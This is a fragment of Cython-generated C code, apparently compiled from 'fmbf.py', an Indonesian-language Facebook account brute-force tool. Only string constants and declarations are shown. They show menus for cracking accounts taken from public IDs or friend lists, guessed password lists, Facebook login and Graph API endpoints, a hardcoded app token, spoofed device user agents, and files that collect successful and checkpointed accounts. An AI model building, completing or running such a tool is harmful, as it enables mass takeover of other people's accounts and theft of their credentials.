static const char __pyx_k_603_2_4[] = "603.2.4";
static const char __pyx_k_603_3_8[] = "603.3.8";
static const char __pyx_k_A_d_B_Y[] = "%A-%d-%B-%Y";
static const char __pyx_k_Android[] = "Android (.*?);";
static const char __pyx_k_DEFAULT[] = "DEFAULT";
static const char __pyx_k_Default[] = "Default";
static const char __pyx_k_Premium[] = "Premium";
static const char __pyx_k_Session[] = "Session";
static const char __pyx_k_android[] = "android";
static const char __pyx_k_cookies[] = "cookies";
static const char __pyx_k_cursors[] = "cursors";
static const char __pyx_k_default[] = "default";
static const char __pyx_k_findall[] = "findall";
static const char __pyx_k_fmbf_py[] = "fmbf.py";
static const char __pyx_k_friends[] = "friends";
static const char __pyx_k_genexpr[] = "genexpr";
static const char __pyx_k_headers[] = "headers";
static const char __pyx_k_jazoest[] = "jazoest";
static const char __pyx_k_listdir[] = "listdir";
static const char __pyx_k_message[] = "message";
static const char __pyx_k_prepare[] = "__prepare__";
static const char __pyx_k_randint[] = "randint";
static const char __pyx_k_referer[] = "referer";
static const char __pyx_k_replace[] = "replace";
static const char __pyx_k_tampung[] = "tampung";
static const char __pyx_k_tanggal[] = " [+] tanggal : ";
static const char __pyx_k_token_2[] = "token";
static const char __pyx_k_601_1_46[] = "601.1.46";
static const char __pyx_k_602_1_50[] = "602.1.50";
static const char __pyx_k_602_2_14[] = "602.2.14";
static const char __pyx_k_602_3_12[] = "602.3.12";
static const char __pyx_k_603_1_30[] = "603.1.30";
static const char __pyx_k_datetime[] = "datetime";
static const char __pyx_k_get_dict[] = "get_dict";
static const char __pyx_k_hari_ini[] = "hari_ini";
static const char __pyx_k_method_2[] = "method";
static const char __pyx_k_password[] = "password";
static const char __pyx_k_qualname[] = "__qualname__";
static const char __pyx_k_requests[] = "requests";
static const char __pyx_k_strftime[] = "strftime";
static const char __pyx_k_total_id[] = "\n\n [+] total id -> ";
static const char __pyx_k_usragent[] = "usragent";
static const char __pyx_k_x_fb_lsd[] = "x-fb-lsd";
static const char __pyx_k_Android_2[] = "\"Android\"";
static const char __pyx_k_Bergabung[] = " [*] Bergabung   : ";
static const char __pyx_k_EXCELLENT[] = "EXCELLENT";
static const char __pyx_k_Main_logo[] = "Main.logo";
static const char __pyx_k_Main_menu[] = "Main.menu";
static const char __pyx_k_atursandi[] = "atursandi";
static const char __pyx_k_max_age_0[] = "max-age=0";
static const char __pyx_k_metaclass[] = "__metaclass__";
static const char __pyx_k_randrange[] = "randrange";
static const char __pyx_k_sec_ch_ua[] = "sec-ch-ua";
static const char __pyx_k_set_ugent[] = "set_ugent";
static const char __pyx_k_token_txt[] = "token.txt";
static const char __pyx_k_verchrome[] = "verchrome";
static const char __pyx_k_Main_login[] = "Main.login";
static const char __pyx_k_cek_result[] = "cek_result";
static const char __pyx_k_checkpoint[] = "checkpoint";
static const char __pyx_k_connection[] = "connection";
static const char __pyx_k_cookie_txt[] = "cookie.txt";
static const char __pyx_k_data_ugent[] = "data/ugent";
static const char __pyx_k_keep_alive[] = "keep-alive";
static const char __pyx_k_metode_api[] = "metode_api";
static const char __pyx_k_pilih_menu[] = "\n [?] pilih menu : ";
static const char __pyx_k_splitlines[] = "splitlines";
static const char __pyx_k_subprocess[] = "subprocess";
static const char __pyx_k_user_agent[] = "user-agent";
static const char __pyx_k_CPU_OS_like[] = "CPU OS (.*?) like";
static const char __pyx_k_Crack_sandi[] = "Crack.sandi";
static const char __pyx_k_Main___init[] = "Main.__init__";
static const char __pyx_k_Main_publik[] = "Main.publik";
static const char __pyx_k_accessToken[] = "accessToken=\"(.*?)\"";
static const char __pyx_k_max_workers[] = "max_workers";
static const char __pyx_k_same_origin[] = "same-origin";
static const char __pyx_k_sdk_version[] = "sdk_version";
static const char __pyx_k_session_key[] = "session_key";
static const char __pyx_k_Crack___init[] = "Crack.__init__";
static const char __pyx_k_CriOS_Mobile[] = "CriOS/(.*?) Mobile";
static const char __pyx_k_access_token[] = "access_token";
static const char __pyx_k_build_device[] = "build_device";
static const char __pyx_k_check_output[] = "check_output";
static const char __pyx_k_content_type[] = "content-type";
static const char __pyx_k_gzip_deflate[] = "gzip, deflate";
static const char __pyx_k_login_no_pin[] = "login_no_pin";
static const char __pyx_k_model_device[] = "model_device";
static const char __pyx_k_simpan_hasil[] = "simpan_hasil";
static const char __pyx_k_versi_chrome[] = "versi_chrome";
static const char __pyx_k_versi_iphone[] = "versi_iphone";
static const char __pyx_k_x_fb_net_hni[] = "x-fb-net-hni";
static const char __pyx_k_x_fb_sim_hni[] = "x-fb-sim-hni";
static const char __pyx_k_BeautifulSoup[] = "BeautifulSoup";
static const char __pyx_k_Chrome_Mobile[] = "Chrome/(.*?) Mobile";
static const char __pyx_k_cache_control[] = "cache-control";
static const char __pyx_k_crack_selesai[] = "\n\n [#] crack selesai....";
static const char __pyx_k_versi_android[] = "versi_android";
static const char __pyx_k_Main_set_ugent[] = "Main.set_ugent";
static const char __pyx_k_XMLHttpRequest[] = "XMLHttpRequest";
static const char __pyx_k_act_nav_source[] = "act=(.*?)&nav_source";
static const char __pyx_k_content_length[] = "content-length";
static const char __pyx_k_cookie_invalid[] = " [!] cookie invalid";
static const char __pyx_k_data_token_txt[] = "data/token.txt";
static const char __pyx_k_file_tidak_ada[] = "file tidak ada";
static const char __pyx_k_id_ID_id_q_0_9[] = "id-ID,id;q=0.9";
static const char __pyx_k_m_facebook_com[] = "m.facebook.com";
static const char __pyx_k_masukan_cookie[] = "\n [+] masukan cookie : ";
static const char __pyx_k_name_lsd_value[] = "name=\"lsd\" value=\"(.*?)\"";
static const char __pyx_k_sandi_tambahan[] = " [?] sandi tambahan : ";
static const char __pyx_k_sec_fetch_dest[] = "sec-fetch-dest";
static const char __pyx_k_sec_fetch_mode[] = "sec-fetch-mode";
static const char __pyx_k_sec_fetch_site[] = "sec-fetch-site";
static const char __pyx_k_sec_fetch_user[] = "sec-fetch-user";
static const char __pyx_k_selamat_datang[] = "\n [ selamat datang ";
static const char __pyx_k_ConnectionError[] = "ConnectionError";
static const char __pyx_k_Crack_atursandi[] = "Crack.atursandi";
static const char __pyx_k_Main_cek_result[] = "Main.cek_result";
static const char __pyx_k_accept_encoding[] = "accept-encoding";
static const char __pyx_k_accept_language[] = "accept-language";
static const char __pyx_k_allow_redirects[] = "allow_redirects";
static const char __pyx_k_data_cookie_txt[] = "data/cookie.txt";
static const char __pyx_k_gzip_deflate_br[] = "gzip, deflate br";
static const char __pyx_k_metode_validate[] = "metode_validate";
static const char __pyx_k_session_cookies[] = "session_cookies";
static const char __pyx_k_Crack_metode_api[] = "Crack.metode_api";
static const char __pyx_k_Mozilla_5_0_iPad[] = "Mozilla/5.0 (iPad";
static const char __pyx_k_sec_ch_ua_mobile[] = "sec-ch-ua-mobile";
static const char __pyx_k_x_fb_http_engine[] = "x-fb-http-engine";
static const char __pyx_k_x_requested_with[] = "x-requested-with";
static const char __pyx_k_1_method_API_fast[] = "\n [1]. method API (fast)";
static const char __pyx_k_berhasil_generate[] = "\n [+] berhasil generate ";
static const char __pyx_k_masukan_nama_file[] = "\n [?] masukan nama file : ";
static const char __pyx_k_masukan_useragent[] = " [*] masukan useragent : ";
static const char __pyx_k_CPU_iPhone_OS_like[] = "CPU iPhone OS (.*?) like";
static const char __pyx_k_Crack_simpan_hasil[] = "Crack.simpan_hasil";
static const char __pyx_k_Mozilla_5_0_iPhone[] = "Mozilla/5.0 (iPhone";
static const char __pyx_k_ThreadPoolExecutor[] = "ThreadPoolExecutor";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_concurrent_futures[] = "concurrent.futures";
static const char __pyx_k_graph_facebook_com[] = "graph.facebook.com";
static const char __pyx_k_logout_hapus_login[] = "]. logout (hapus login)";
static const char __pyx_k_name_jazoest_value[] = "name=\"jazoest\" value=\"(.*?)\"";
static const char __pyx_k_sec_ch_ua_platform[] = "sec-ch-ua-platform";
static const char __pyx_k_getprop_ro_build_id[] = "getprop ro.build.id";
static const char __pyx_k_mbasic_facebook_com[] = "mbasic.facebook.com";
static const char __pyx_k_requests_exceptions[] = "requests.exceptions";
static const char __pyx_k_sedang_mengumpulkan[] = "\r [*] sedang mengumpulkan ";
static const char __pyx_k_02_setting_useragent[] = " [02]. setting useragent";
static const char __pyx_k_2_method_mbasic_slow[] = " [2]. method mbasic (slow)";
static const char __pyx_k_Nexus_5_Build_NHG47L[] = "Nexus 5 Build/NHG47L";
static const char __pyx_k_Nexus_7_Build_LMY47V[] = "Nexus 7 Build/LMY47V";
static const char __pyx_k_http_ip_api_com_json[] = "http://ip-api.com/json/";
static const char __pyx_k_Crack_metode_validate[] = "Crack.metode_validate";
static const char __pyx_k_Nexus_5X_Build_MMB29K[] = "Nexus 5X Build/MMB29K";
static const char __pyx_k_Nexus_5X_Build_N4F26T[] = "Nexus 5X Build/N4F26T";
static const char __pyx_k_nav_source_no_referrer[] = "&nav_source=no_referrer";
static const char __pyx_k_01_crack_dari_id_publik[] = " [01]. crack dari id publik";
static const char __pyx_k_KHTML_like_Gecko_Mobile[] = " (KHTML, like Gecko) Mobile/";
static const char __pyx_k_hasil_CP_disimpan_ke_CP[] = " [+] hasil CP disimpan ke : CP/";
static const char __pyx_k_hasil_OK_disimpan_ke_OK[] = "\n [+] hasil OK disimpan ke : OK/";
static const char __pyx_k_x_fb_connection_quality[] = "x-fb-connection-quality";
static const char __pyx_k_berhasil_menghapus_login[] = " [+] berhasil menghapus login";
static const char __pyx_k_generate_session_cookies[] = "generate_session_cookies";
static const char __pyx_k_getprop_ro_product_model[] = "getprop ro.product.model";
static const char __pyx_k_https_graph_facebook_com[] = "https://graph.facebook.com/";
static const char __pyx_k_masukan_id_atau_username[] = " [*] masukan id atau username : ";
static const char __pyx_k_03_lihat_akun_hasil_crack[] = " [03]. lihat akun hasil crack";
static const char __pyx_k_Mozilla_5_0_Linux_Android[] = "Mozilla/5.0 (Linux; Android";
static const char __pyx_k_like_Mac_OS_X_AppleWebKit[] = " like Mac OS X) AppleWebKit/";
static const char __pyx_k_upgrade_insecure_requests[] = "upgrade-insecure-requests";
static const char __pyx_k_x_fb_connection_bandwidth[] = "x-fb-connection-bandwidth";
static const char __pyx_k_01_cek_akun_hasil_crack_OK[] = "\n [01]. cek akun hasil crack OK";
static const char __pyx_k_02_cek_akun_hasil_crack_CP[] = " [02]. cek akun hasil crack CP";
static const char __pyx_k_0_0_0_Mobile_Safari_537_36[] = ".0.0.0 Mobile Safari/537.36";
static const char __pyx_k_3_method_mobile_super_slow[] = " [3]. method mobile (super slow)";
static const char __pyx_k_useragent_dan_di_simpan_ke[] = " useragent dan di simpan ke ";
static const char __pyx_k_Mozilla_5_0_Linux_Android_2[] = "Mozilla/5.0 (Linux; Android ";
static const char __pyx_k_Mozilla_5_0_Linux_U_Android[] = "Mozilla/5.0 (Linux; U; Android";
static const char __pyx_k_Nexus_6_Build_OPM5_171019_015[] = "Nexus 6 Build/OPM5.171019.015";
static const char __pyx_k_kata_sandi_minimal_6_karakter[] = " [!] kata sandi minimal 6 karakter";
static const char __pyx_k_Nexus_5X_Build_OPR6_170623_023[] = "Nexus 5X Build/OPR6.170623.023";
static const char __pyx_k_Nexus_6P_Build_OPM5_171019_014[] = "Nexus 6P Build/OPM5.171019.014";
static const char __pyx_k_User_must_verify_their_account[] = "User must verify their account";
static const char __pyx_k_login_save_device_login_source[] = "/login/save-device/?login_source=login";
static const char __pyx_k_AppleWebKit_537_36_KHTML_like_G[] = ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/";
static const char __pyx_k_Author_Fall_Xavier_Dominic_Grem[] = "[*] Author      : Fall Xavier Dominic Gremory XV.";
static const char __pyx_k_Crack_metode_api_locals_genexpr[] = "Crack.metode_api.<locals>.genexpr";
static const char __pyx_k_FBAN_MessengerForiOS_FBAV_112_0[] = " [FBAN/MessengerForiOS;FBAV/112.0.0.36.";
static const char __pyx_k_FBBV_54364624_FBDV_iPhone5_1_FB[] = ";FBBV/54364624;FBDV/iPhone5,1;FBMD/iPhone;FBSN/iOS;FBSV/";
static const char __pyx_k_FBSS_2_FBCR_T_Mobile_FBID_phone[] = ";FBSS/2;FBCR/T-Mobile;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]";
static const char __pyx_k_Github_https_github_com_Fall_Xa[] = " [*] Github      : https://github.com/Fall-Xavier";
static const char __pyx_k_Not_A_Brand_v_99_Chromium_v_101[] = "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"101\"";
static const char __pyx_k_anda_bisa_mematikan_data_selula[] = "\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n";
static const char __pyx_k_berhasil_mengecek_total_len_fil[] = "\n [#] berhasil mengecek total {len(file)} {folder}";
static const char __pyx_k_berhasil_mengembalikan_useragen[] = " [#] berhasil mengembalikan useragent ke default";
static const char __pyx_k_gunakan_untuk_pemisah_contoh_sa[] = "\n [!] gunakan , untuk pemisah contoh : sayang,bismillah,rahasia,123456";
static const char __pyx_k_id_ID_id_q_0_9_en_US_q_0_8_en_q[] = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7";
static const char __pyx_k_isi_me_jika_ingin_crack_dari_da[] = " [*] isi 'me' jika ingin crack dari daftar teman";
static const char __pyx_k_ketik_myua_jika_ingin_ua_hp_sen[] = " [*] ketik 'myua' jika ingin ua hp sendiri dan 'default' jika ingin kembali ke ua default";
static const char __pyx_k_login_device_based_validate_pas[] = "/login/device-based/validate-password/?shbl=0";
static const char __pyx_k_login_next_ref_dbl_fl_login_fro[] = "/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8";
static const char __pyx_k_text_html_application_xhtml_xml[] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
static const char __pyx_k_200424423651082_2a9918c6bcd75b94[] = "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16";
static const char __pyx_k_4f648f21fb58fcd2aa1c65f35f441ef5[] = "4f648f21fb58fcd2aa1c65f35f441ef5";
static const char __pyx_k_Mozilla_5_0_Linux_Android_11_AC2[] = "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36";
static const char __pyx_k_Mozilla_5_0_iPhone_CPU_iPhone_OS[] = "Mozilla/5.0 (iPhone; CPU iPhone OS ";
static const char __pyx_k_Nexus_5X_Build_OPM6_171019_030_H[] = "Nexus 5X Build/OPM6.171019.030.H1";
static const char __pyx_k_User_must_verify_their_account_o[] = "User must verify their account on www.facebook.com";
static const char __pyx_k_application_x_www_form_urlencode[] = "application/x-www-form-urlencoded";
static const char __pyx_k_https_graph_facebook_com_auth_lo[] = "https://graph.facebook.com/auth/login";
static const char __pyx_k_https_graph_facebook_com_me_acce[] = "https://graph.facebook.com/me?access_token=";
static const char __pyx_k_https_www_facebook_com_adsmanage[] = "https://www.facebook.com/adsmanager/manage/campaigns";
static const char __pyx_k_name_friends_fields_id_name_birt[] = "name,friends.fields(id,name,birthday)";
static const char __pyx_k_https_www_facebook_com_adsmanage_2[] = "https://www.facebook.com/adsmanager/manage/campaigns?act=";
static const char __pyx_k_name_friends_fields_id_name_birt_2[] = "name,friends.fields(id,name,birthday).after(";
static PyObject *__pyx_kp_u_;
static PyObject *__pyx_kp_s_0;
static PyObject *__pyx_kp_s_00;
static PyObject *__pyx_kp_u_00;
static PyObject *__pyx_kp_s_01;
static PyObject *__pyx_kp_s_01_cek_akun_hasil_crack_OK;
static PyObject *__pyx_kp_s_01_crack_dari_id_publik;
static PyObject *__pyx_kp_s_02;
static PyObject *__pyx_kp_s_02_cek_akun_hasil_crack_CP;
static PyObject *__pyx_kp_s_02_setting_useragent;
static PyObject *__pyx_kp_s_03;
static PyObject *__pyx_kp_s_03_lihat_akun_hasil_crack;
static PyObject *__pyx_kp_s_0_0;
static PyObject *__pyx_kp_u_0_0_0_Mobile_Safari_537_36;
static PyObject *__pyx_kp_s_0_0_2;
static PyObject *__pyx_kp_s_0_2;
static PyObject *__pyx_kp_s_0m;
static PyObject *__pyx_kp_s_1;
static PyObject *__pyx_kp_s_10_0_2;
static PyObject *__pyx_kp_s_10_1_1;
static PyObject *__pyx_kp_s_10_2;
static PyObject *__pyx_kp_s_10_2_1;
static PyObject *__pyx_kp_s_10_3_1;
static PyObject *__pyx_kp_s_10_3_2;
static PyObject *__pyx_kp_s_10_3_3;
static PyObject *__pyx_kp_s_123;
static PyObject *__pyx_kp_s_1234;
static PyObject *__pyx_kp_s_12345;
static PyObject *__pyx_kp_s_13C75;
static PyObject *__pyx_kp_s_13D15;
static PyObject *__pyx_kp_s_13E233;
static PyObject *__pyx_kp_s_13E238;
static PyObject *__pyx_kp_s_13F69;
static PyObject *__pyx_kp_s_13G34;
static PyObject *__pyx_kp_s_13G36;
static PyObject *__pyx_kp_s_14A456;
static PyObject *__pyx_kp_s_14B100;
static PyObject *__pyx_kp_s_14C92;
static PyObject *__pyx_kp_s_14D27;
static PyObject *__pyx_kp_s_14E304;
static PyObject *__pyx_kp_s_14F89;
static PyObject *__pyx_kp_s_14G60;
static PyObject *__pyx_kp_s_1_2;
static PyObject *__pyx_kp_s_1_91m;
static PyObject *__pyx_kp_s_1_92m;
static PyObject *__pyx_kp_s_1_93m;
static PyObject *__pyx_kp_s_1_method_API_fast;
static PyObject *__pyx_kp_s_2;
static PyObject *__pyx_kp_u_200;
static PyObject *__pyx_kp_s_200424423651082_2a9918c6bcd75b94;
static PyObject *__pyx_kp_s_2_method_mbasic_slow;
static PyObject *__pyx_kp_s_3;
static PyObject *__pyx_kp_s_3_method_mobile_super_slow;
static PyObject *__pyx_kp_s_4f648f21fb58fcd2aa1c65f35f441ef5;
static PyObject *__pyx_kp_s_601_1_46;
static PyObject *__pyx_kp_s_602_1_50;
static PyObject *__pyx_kp_s_602_2_14;
static PyObject *__pyx_kp_s_602_3_12;
static PyObject *__pyx_kp_s_602_4_6;
static PyObject *__pyx_kp_s_603_1_30;
static PyObject *__pyx_kp_s_603_2_4;
static PyObject *__pyx_kp_s_603_3_8;
static PyObject *__pyx_n_s_A;
static PyObject *__pyx_kp_s_A_d_B_Y;
static PyObject *__pyx_kp_s_Android;
static PyObject *__pyx_kp_s_Android_2;
static PyObject *__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G;
static PyObject *__pyx_kp_u_Author_Fall_Xavier_Dominic_Grem;
static PyObject *__pyx_n_s_B;
static PyObject *__pyx_n_s_BeautifulSoup;
static PyObject *__pyx_kp_u_Bergabung;
static PyObject *__pyx_kp_s_Build;
static PyObject *__pyx_kp_u_Build;
static PyObject *__pyx_n_s_C;
static PyObject *__pyx_n_s_CP;
static PyObject *__pyx_kp_s_CPU_OS_like;
static PyObject *__pyx_kp_s_CPU_iPhone_OS_like;
static PyObject *__pyx_kp_u_CP_2;
static PyObject *__pyx_kp_u_CP_3;
static PyObject *__pyx_kp_u_Chrome;
static PyObject *__pyx_kp_s_Chrome_Mobile;
static PyObject *__pyx_n_s_ConnectionError;
static PyObject *__pyx_n_s_Crack;
static PyObject *__pyx_n_s_Crack___init;
static PyObject *__pyx_n_s_Crack_atursandi;
static PyObject *__pyx_n_s_Crack_metode_api;
static PyObject *__pyx_n_s_Crack_metode_api_locals_genexpr;
static PyObject *__pyx_n_s_Crack_metode_validate;
static PyObject *__pyx_n_s_Crack_sandi;
static PyObject *__pyx_n_s_Crack_simpan_hasil;
static PyObject *__pyx_kp_u_CriOS;
static PyObject *__pyx_kp_s_CriOS_Mobile;
static PyObject *__pyx_n_s_D;
static PyObject *__pyx_n_s_DEFAULT;
static PyObject *__pyx_n_s_Default;
static PyObject *__pyx_n_s_E;
static PyObject *__pyx_n_s_EAA;
static PyObject *__pyx_n_s_EXCELLENT;
static PyObject *__pyx_n_s_F;
static PyObject *__pyx_kp_u_FBAN_MessengerForiOS_FBAV_112_0;
static PyObject *__pyx_kp_u_FBBV_54364624_FBDV_iPhone5_1_FB;
static PyObject *__pyx_kp_u_FBSS_2_FBCR_T_Mobile_FBID_phone;
static PyObject *__pyx_n_s_G;
static PyObject *__pyx_kp_s_Github_https_github_com_Fall_Xa;
static PyObject *__pyx_n_s_H;
static PyObject *__pyx_n_s_Host;
static PyObject *__pyx_n_s_I;
static PyObject *__pyx_kp_u_IP;
static PyObject *__pyx_n_s_J;
static PyObject *__pyx_n_s_K;
static PyObject *__pyx_kp_u_KHTML_like_Gecko_Mobile;
static PyObject *__pyx_n_s_L;
static PyObject *__pyx_n_s_Liger;
static PyObject *__pyx_n_s_M;
static PyObject *__pyx_n_s_Main;
static PyObject *__pyx_n_s_Main___init;
static PyObject *__pyx_n_s_Main_cek_result;
static PyObject *__pyx_n_s_Main_login;
static PyObject *__pyx_n_s_Main_logo;
static PyObject *__pyx_n_s_Main_menu;
static PyObject *__pyx_n_s_Main_publik;
static PyObject *__pyx_n_s_Main_set_ugent;
static PyObject *__pyx_kp_u_Mobile;
static PyObject *__pyx_kp_s_Mozilla_5_0_Linux_Android;
static PyObject *__pyx_kp_s_Mozilla_5_0_Linux_Android_11_AC2;
static PyObject *__pyx_kp_u_Mozilla_5_0_Linux_Android_2;
static PyObject *__pyx_kp_s_Mozilla_5_0_Linux_U_Android;
static PyObject *__pyx_kp_s_Mozilla_5_0_iPad;
static PyObject *__pyx_kp_s_Mozilla_5_0_iPhone;
static PyObject *__pyx_kp_u_Mozilla_5_0_iPhone_CPU_iPhone_OS;
static PyObject *__pyx_n_s_N;
static PyObject *__pyx_kp_s_Nexus_5X_Build_MMB29K;
static PyObject *__pyx_kp_s_Nexus_5X_Build_N4F26T;
static PyObject *__pyx_kp_s_Nexus_5X_Build_OPM6_171019_030_H;
static PyObject *__pyx_kp_s_Nexus_5X_Build_OPR6_170623_023;
static PyObject *__pyx_kp_s_Nexus_5_Build_NHG47L;
static PyObject *__pyx_kp_s_Nexus_6P_Build_OPM5_171019_014;
static PyObject *__pyx_kp_s_Nexus_6_Build_OPM5_171019_015;
static PyObject *__pyx_kp_s_Nexus_7_Build_LMY47V;
static PyObject *__pyx_kp_s_Not_A_Brand_v_99_Chromium_v_101;
static PyObject *__pyx_n_s_O;
static PyObject *__pyx_n_s_OK;
static PyObject *__pyx_kp_u_OK_2;
static PyObject *__pyx_kp_u_OK_3;
static PyObject *__pyx_n_s_P;
static PyObject *__pyx_n_u_Premium;
static PyObject *__pyx_n_s_Q;
static PyObject *__pyx_n_s_R;
static PyObject *__pyx_n_s_S;
static PyObject *__pyx_n_s_Session;
static PyObject *__pyx_kp_u_Status;
static PyObject *__pyx_n_s_T;
static PyObject *__pyx_n_s_ThreadPoolExecutor;
static PyObject *__pyx_n_s_U;
static PyObject *__pyx_kp_s_User_must_verify_their_account;
static PyObject *__pyx_kp_s_User_must_verify_their_account_o;
static PyObject *__pyx_n_s_V;
static PyObject *__pyx_n_s_W;
static PyObject *__pyx_n_s_X;
static PyObject *__pyx_n_s_XMLHttpRequest;
static PyObject *__pyx_n_s_Y;
static PyObject *__pyx_n_s_Z;
static PyObject *__pyx_kp_u__13;
static PyObject *__pyx_kp_u__17;
static PyObject *__pyx_kp_s__2;
static PyObject *__pyx_kp_u__2;
static PyObject *__pyx_kp_s__21;
static PyObject *__pyx_kp_s__23;
static PyObject *__pyx_kp_u__24;
static PyObject *__pyx_kp_s__25;
static PyObject *__pyx_kp_s__32;
static PyObject *__pyx_n_s__36;
static PyObject *__pyx_kp_s__39;
static PyObject *__pyx_kp_u__39;
static PyObject *__pyx_kp_s__4;
static PyObject *__pyx_kp_u__42;
static PyObject *__pyx_kp_u__46;
static PyObject *__pyx_kp_s__48;
static PyObject *__pyx_kp_u__48;
static PyObject *__pyx_kp_s__58;
static PyObject *__pyx_kp_s__61;
static PyObject *__pyx_kp_u__62;
static PyObject *__pyx_kp_s__68;
static PyObject *__pyx_kp_u__69;
static PyObject *__pyx_kp_u__70;
static PyObject *__pyx_kp_u__71;
static PyObject *__pyx_kp_u__72;
static PyObject *__pyx_kp_u__73;
static PyObject *__pyx_kp_u__74;
static PyObject *__pyx_kp_s__75;
static PyObject *__pyx_n_s_a;
static PyObject *__pyx_n_s_accept;
static PyObject *__pyx_kp_s_accept_encoding;
static PyObject *__pyx_kp_s_accept_language;
static PyObject *__pyx_kp_s_accessToken;
static PyObject *__pyx_n_s_access_token;
static PyObject *__pyx_kp_s_act_nav_source;
static PyObject *__pyx_n_s_after;
static PyObject *__pyx_n_s_allow_redirects;
static PyObject *__pyx_kp_s_anda_bisa_mematikan_data_selula;
static PyObject *__pyx_n_s_android;
static PyObject *__pyx_n_s_anj;
static PyObject *__pyx_n_s_api;
static PyObject *__pyx_n_s_append;
static PyObject *__pyx_kp_s_application_x_www_form_urlencode;
static PyObject *__pyx_n_s_args;
static PyObject *__pyx_n_s_ask;
static PyObject *__pyx_n_s_atursandi;
static PyObject *__pyx_n_s_az;
static PyObject *__pyx_kp_u_berhasil_generate;
static PyObject *__pyx_kp_s_berhasil_mengecek_total_len_fil;
static PyObject *__pyx_kp_s_berhasil_mengembalikan_useragen;
static PyObject *__pyx_kp_s_berhasil_menghapus_login;
static PyObject *__pyx_n_s_bs4;
static PyObject *__pyx_n_s_build;
static PyObject *__pyx_n_s_build_device;
static PyObject *__pyx_n_s_c_user;
static PyObject *__pyx_kp_s_cache_control;
static PyObject *__pyx_n_s_cek_result;
static PyObject *__pyx_n_s_check_output;
static PyObject *__pyx_n_s_checkpoint;
static PyObject *__pyx_n_s_choice;
static PyObject *__pyx_n_s_clear;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_close;
static PyObject *__pyx_n_s_cok;
static PyObject *__pyx_n_s_concurrent_futures;
static PyObject *__pyx_n_s_connection;
static PyObject *__pyx_kp_s_content_length;
static PyObject *__pyx_kp_s_content_type;
static PyObject *__pyx_n_s_cookie;
static PyObject *__pyx_kp_s_cookie_invalid;
static PyObject *__pyx_kp_s_cookie_txt;
static PyObject *__pyx_n_s_cookies;
static PyObject *__pyx_n_s_cors;
static PyObject *__pyx_n_s_cp;
static PyObject *__pyx_kp_u_crack;
static PyObject *__pyx_kp_s_crack_selesai;
static PyObject *__pyx_n_s_cursors;
static PyObject *__pyx_kp_s_d_B_Y;
static PyObject *__pyx_n_s_data;
static PyObject *__pyx_kp_s_data_cookie_txt;
static PyObject *__pyx_kp_s_data_token_txt;
static PyObject *__pyx_kp_s_data_ugent;
static PyObject *__pyx_kp_u_data_ugent;
static PyObject *__pyx_n_s_date;
static PyObject *__pyx_n_s_datetime;
static PyObject *__pyx_n_s_decode;
static PyObject *__pyx_n_s_default;
static PyObject *__pyx_n_s_depan;
static PyObject *__pyx_n_s_dev;
static PyObject *__pyx_n_s_device;
static PyObject *__pyx_n_s_dirs;
static PyObject *__pyx_n_s_doc;
static PyObject *__pyx_n_s_email;
static PyObject *__pyx_n_s_empty;
static PyObject *__pyx_n_s_en_US;
static PyObject *__pyx_n_s_enter;
static PyObject *__pyx_n_s_error;
static PyObject *__pyx_n_s_exit;
static PyObject *__pyx_n_s_exit_2;
static PyObject *__pyx_n_s_fall;
static PyObject *__pyx_n_s_fields;
static PyObject *__pyx_n_s_fil;
static PyObject *__pyx_n_s_file;
static PyObject *__pyx_kp_s_file_tidak_ada;
static PyObject *__pyx_n_s_findall;
static PyObject *__pyx_n_s_flow;
static PyObject *__pyx_n_s_flush;
static PyObject *__pyx_n_s_fmbf;
static PyObject *__pyx_kp_s_fmbf_py;
static PyObject *__pyx_n_s_folder;
static PyObject *__pyx_n_s_friends;
static PyObject *__pyx_n_s_generate_session_cookies;
static PyObject *__pyx_n_s_genexpr;
static PyObject *__pyx_n_s_get;
static PyObject *__pyx_n_s_get_dict;
static PyObject *__pyx_kp_s_getprop_ro_build_id;
static PyObject *__pyx_kp_s_getprop_ro_product_model;
static PyObject *__pyx_kp_s_graph_facebook_com;
static PyObject *__pyx_n_s_group;
static PyObject *__pyx_kp_s_gunakan_untuk_pemisah_contoh_sa;
static PyObject *__pyx_kp_s_gzip_deflate;
static PyObject *__pyx_kp_s_gzip_deflate_br;
static PyObject *__pyx_n_s_hari_ini;
static PyObject *__pyx_kp_u_hasil_CP_disimpan_ke_CP;
static PyObject *__pyx_kp_u_hasil_OK_disimpan_ke_OK;
static PyObject *__pyx_n_s_headers;
static PyObject *__pyx_n_s_host;
static PyObject *__pyx_kp_s_http_ip_api_com_json;
static PyObject *__pyx_kp_u_https;
static PyObject *__pyx_kp_u_https_graph_facebook_com;
static PyObject *__pyx_kp_s_https_graph_facebook_com_auth_lo;
static PyObject *__pyx_kp_u_https_graph_facebook_com_me_acce;
static PyObject *__pyx_kp_s_https_www_facebook_com_adsmanage;
static PyObject *__pyx_kp_u_https_www_facebook_com_adsmanage_2;
static PyObject *__pyx_n_s_i;
static PyObject *__pyx_n_s_id;
static PyObject *__pyx_kp_u_id_2;
static PyObject *__pyx_kp_s_id_ID_id_q_0_9;
static PyObject *__pyx_kp_s_id_ID_id_q_0_9_en_US_q_0_8_en_q;
static PyObject *__pyx_n_s_idz;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_init;
static PyObject *__pyx_n_s_input;
static PyObject *__pyx_n_s_insert;
static PyObject *__pyx_n_s_ip;
static PyObject *__pyx_kp_s_isi_me_jika_ingin_crack_dari_da;
static PyObject *__pyx_n_s_items;
static PyObject *__pyx_n_s_jazoest;
static PyObject *__pyx_n_s_join;
static PyObject *__pyx_n_s_json;
static PyObject *__pyx_kp_s_kata_sandi_minimal_6_karakter;
static PyObject *__pyx_kp_s_keep_alive;
static PyObject *__pyx_kp_s_ketik_myua_jika_ingin_ua_hp_sen;
